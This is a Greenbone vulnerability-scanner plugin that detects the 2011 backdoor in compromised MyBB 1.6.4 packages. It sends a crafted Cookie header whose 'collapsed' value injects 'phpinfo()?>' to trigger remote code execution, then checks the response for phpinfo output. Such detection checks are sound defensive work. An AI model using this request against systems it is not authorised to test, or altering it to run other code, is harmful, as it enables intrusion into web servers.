# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = 'cpe:/a:mybb:mybb';

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103292");
  script_version("2023-07-28T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-07-28 05:05:23 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-10-10 15:33:49 +0200 (Mon, 10 Oct 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("MyBB Compromised Source Packages Backdoor Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49993");
  script_xref(name:"URL", value:"http://blog.mybb.com/2011/10/06/1-6-4-security-vulnerabilit/");
  script_xref(name:"URL", value:"http://www.mybb.com/");
  script_xref(name:"URL", value:"http://blog.mybb.com/wp-content/uploads/2011/10/mybb_1604_patches.txt");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("sw_mybb_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("MyBB/installed");

  script_tag(name:"solution", value:"The vendor released an update. Please see the references for details.");
  script_tag(name:"summary", value:"MyBB is prone to a backdoor vulnerability.");
  script_tag(name:"affected", value:"MyBB versions 1.6.4 prior to October 6th, 2011 are vulnerable.");
  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary code in the
 context of the application. Successful attacks will compromise the
 affected application.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if (dir == "/") dir = "";

host = http_host_name(port:port);

url = string(dir, "/index.php");

req = string(
          "GET ", url, " HTTP/1.1\r\n",
          "Host: ", host, "\r\n",
          "Cookie: collapsed=0%7c1%7c2%7c3%7c4%7c5%7c6%7c7%7c8%7c9%7c10%7c11%7c12%7c13%7c14%7c15%7c16%7c17%7c18%7c19%7c20%7c21%7c22%7cphpinfo()?>",
          "\r\n\r\n"
        );

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("<title>phpinfo()" >< result) {
  security_message(port:port);
  exit(0);
}

exit(99);
